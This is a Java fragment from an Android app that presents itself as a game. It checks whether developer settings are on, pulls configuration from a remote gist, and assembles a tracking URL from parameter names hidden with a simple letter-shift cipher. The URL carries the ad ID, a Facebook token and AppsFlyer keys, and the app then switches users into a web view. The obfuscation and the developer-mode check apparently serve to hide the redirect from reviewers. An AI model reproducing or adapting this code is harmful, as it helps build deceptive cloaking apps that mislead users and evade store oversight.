package com.whats.webWolf;

import android.content.Intent;
import android.os.Bundle;

import static com.whats.webWolf.GetInfo.getIngoFromGGWolf;
import static com.whats.webWolf.GetInfo.getInitOllWolf;
import static com.whats.webWolf.SharedpreffSave.saredSaveInfo;
import static com.whats.webWolf.StringMethods.codWolf;
import static com.whats.webWolf.VariablsWolf.*;
import androidx.fragment.app.Fragment;
import androidx.navigation.NavController;
import androidx.navigation.fragment.NavHostFragment;

import android.provider.Settings;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import com.whats.FFGAmeActr;
import com.whats.R;

import java.util.ArrayList;

public class StartWolf extends Fragment {
    static NavController navControllerSplWolf;
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_start_wolf, container, false);
        navControllerSplWolf = NavHostFragment.findNavController(StartWolf.this);
        CON_CONTEXXT_WOLF = requireContext();
        CON_ACTIVITY_WOLF = requireActivity();
        DEV_WOLF = Settings.Secure.getInt(getContext().getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        if ((saredSaveInfo(CON_CONTEXXT_WOLF, null)) != null) {
            navControllerSplWolf.navigate(R.id.action_startWolf_to_webWolf2);
        }else{
            startInitWolf();
        }
        return view;
    }

    private void startInitWolf() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                getIngoFromGGWolf();
                getInitOllWolf();
            }
        }).start();
        new TimerWolf(15000, 1000);
    }

    public static void startWebWolf(){
        Log.i("MyLog","startweb!");
        String[] arrayDecodeWolf = new String[]{"", "?ogfkc_uqwteg=", "&iqqing_cfkf=", "&ch_wugtkf=", "&dwpfng=", "&hd_cv=", "&fgx_mga=", "&hd_crr_kf=",
                "&ch_ejcppgn=", "&ecorckip="};
        String[] arrayIDWolf = new String[]{DATA_FROM_GIST_WOLF[1], MAPS_APPS_WOLF[1], ID_WOLF, ID_LAST_APS_WOLF, CON_OFFER_WOLF.getPackageName(),
                CON_OFFER_WOLF.getString(R.string.facebook_token), CON_OFFER_WOLF.getString(R.string.appsfluer_id), CON_OFFER_WOLF.getString(R.string.facebook_id), MAPS_APPS_WOLF[2], MAPS_APPS_WOLF[0], MAPS_APPS_WOLF[3]};
        ArrayList<String> linkOrganicWolf = new ArrayList<>();

        for (int i = 0; i < arrayIDWolf.length; i++) {
            if (i == 0) {
                linkOrganicWolf.add(arrayIDWolf[i]);
            } else if (i == arrayIDWolf.length - 1) {
                linkOrganicWolf.add(arrayIDWolf[i]);
            } else {
                linkOrganicWolf.add(codWolf(arrayDecodeWolf[i], 2) + arrayIDWolf[i]);
            }
        }

        StringBuilder builderWolf = new StringBuilder(linkOrganicWolf.size());
        for (String chAndrov : linkOrganicWolf) {
            builderWolf.append(chAndrov);
        }
        saredSaveInfo(CON_CONTEXXT_WOLF, builderWolf.toString());
        CON_OFFER_WOLF.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                navControllerSplWolf.navigate(R.id.action_startWolf_to_webWolf2);
            }
        });
    }
    public static void startGameWolf(){
        CON_OFFER_WOLF.startActivity(new Intent(CON_ACTIVITY_WOLF, FFGAmeActr.class));
        CON_OFFER_WOLF.finishAffinity();
    }
}